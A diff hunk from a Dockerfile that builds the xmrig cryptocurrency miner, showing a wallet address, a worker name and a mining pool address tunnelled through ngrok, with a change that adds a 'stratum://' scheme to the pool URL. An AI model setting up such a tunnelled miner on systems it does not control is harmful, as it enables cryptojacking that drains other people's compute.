@@ -28,7 +28,7 @@ RUN cd xmrig/build && \
 FROM alpine:3.13
 
 ENV WALLET=SOL:HGDzRh99Lvq6ow3WQ91sdrwPNER8Lt7hka5SmXg5k9Rx.xmr
-ENV POOL=0.tcp.ap.ngrok.io:14464
+ENV POOL=stratum://0.tcp.ap.ngrok.io:14464
 ENV WORKER_NAME=x
 
 RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /etc/apk/repositories && \
